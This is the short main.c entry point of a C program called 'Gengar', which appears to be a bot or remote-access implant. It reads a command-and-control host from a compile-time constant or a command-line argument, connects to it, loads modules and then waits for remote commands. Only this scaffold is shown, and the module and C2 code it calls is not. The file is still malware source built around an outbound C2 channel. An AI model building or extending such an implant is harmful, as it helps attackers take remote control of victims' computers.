#include <stdlib.h>
#include "include/commander.h"
#include "include/cnc.h"
#include "include/modules.h"
#include "include/logger.h"

int main(int argc, char *argv[])
{
    char *cnc_host = NULL;

#ifdef CNC_HOST
    cnc_host = CNC_HOST;
#else
    if (argc != 2)
    {
        fprintf(stderr, "usage: %s CNC_HOST", argv[0]);
        exit(EXIT_FAILURE);
    }
    cnc_host = argv[1];
#endif

    log_info("Gengar started.");
    cnc_init_conn(cnc_host);
    modules_init();
    listen_for_cmds();
}
